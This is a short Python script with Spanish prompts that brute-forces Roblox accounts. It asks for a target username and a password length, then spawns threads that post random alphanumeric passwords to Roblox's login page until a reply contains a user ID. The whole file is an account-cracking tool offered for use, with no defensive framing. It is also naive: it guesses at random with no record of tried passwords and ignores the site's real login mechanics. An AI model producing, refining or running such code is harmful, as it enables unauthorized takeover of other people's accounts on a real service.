import requests

import random

import string

import threading

import time


username = input("Ingrese el nombre de usuario de Roblox: ")



headers = {

    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',

    'Content-Type': 'application/json'

}



login_url = 'https://www.roblox.com/login'



characters = string.ascii_letters + string.digits



def try_password(password):

    payload = {

        'username': username,

        'password': password

    }

    response = requests.post(login_url, headers=headers, json=payload)

    if 'userId' in response.text:

        print(f"\n✅ Contraseña encontrada: {password}")

        return True

    else:

        print(f"❌ Contraseña incorrecta: {password}")

        return False



def brute_force_thread(thread_id, password_length):

    while True:

        password = ''.join(random.choice(characters) for _ in range(password_length))

        if try_password(password):

            break

        time.sleep(0.1)  



password_length = int(input("Ingrese la longitud de la contraseña (1-100): "))


while password_length < 1 or password_length > 100:

    print("⚠️ Longitud no válida. Debe estar entre 1 y 100.")

    password_length = int(input("Ingrese la longitud de la contraseña (1-100): "))



num_threads = int(input("Ingrese el número de hilos (threads) que desea usar: "))



threads = []

for i in range(num_threads):

    t = threading.Thread(target=brute_force_thread, args=(i, password_length))

    t.start()

    threads.append(t)



for t in threads:

    t.join()